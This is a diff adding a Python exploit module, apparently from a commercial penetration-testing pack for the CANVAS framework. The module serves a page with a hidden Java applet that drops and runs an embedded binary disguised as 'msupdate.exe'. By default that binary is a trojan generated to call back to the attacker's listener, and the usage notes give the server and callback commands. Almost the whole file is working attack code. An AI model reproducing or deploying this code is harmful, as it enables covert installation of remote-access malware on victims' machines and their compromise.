@@ -1,0 +1,156 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import base64
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import struct
+
+# GUI info
+NAME = "Malicious Java Applet with embedded binary"
+
+DESCRIPTION = "Malicious Java Applet with embedded binary"
+DOCUMENTATION = {}
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O binpath:"c:\windows\system32\cmd.exe" -O singleexploit:d2sec_applet -l 192.168.1.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : ["All"], 
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1        
+        self.badstring = ""
+        self.jarfile = "arch.jar"
+        self.name = NAME 
+        self.binpath = ""
+        self.binname = "msupdate.exe"
+        self.filename = "index.html"
+        self.mosdeftrojan = ""
+        return
+        
+
+    def makefile(self):
+
+        filedata = """
+<HTML>
+  <APPLET code="applet.class" archive="arch.jar" width=0 height=0>
+    <PARAM name="data" value="BASE64DATA">
+    <PARAM name="bname" value="BINARYNAME">
+    <PARAM name="name" value="Information">
+  </APPLET>
+</HTML>
+"""
+
+        # User binary
+        if (self.binpath != ""):                
+	        f = open(self.binpath, "rb");
+	        buff = f.read()   
+	        f.close()
+	        
+	      # MOSDEF trojan binary
+        else:
+        	buff = self.mosdeftrojan
+        
+        encodedfile = base64.b64encode(buff)
+        encodedname = base64.b64encode(self.binname)
+        
+        filedata = filedata.replace("BASE64DATA", encodedfile)
+        filedata = filedata.replace("BINARYNAME", encodedname)
+           
+        return filedata
+   
+        
+    def maketrojan(self):
+        t_os = canvasos("Windows")
+        t_os.arch = "X86"
+    
+        self.buildmosdeftrojan(self.callback.ip, self.callback.port, http=True, target_os = t_os)        
+        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.binname))        
+        
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()	        
+        
+        self.binpath = self.argsDict.get("binpath", self.binpath)
+
+        if (self.binpath == ""):        	
+        	self.maketrojan()
+                
+        if clientheader.URL.count(self.filename):                        
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+                       	
+        # JAR file request
+        elif clientheader.URL.count(self.jarfile):
+            self.log("Sending JAR file")            
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_applet/" + self.jarfile, "rb")
+            sploitstring = f.read()
+            f.close()            
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)            
+        	
+        # Redirect
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+            
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+                           
+    def run(self):                        	            	
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
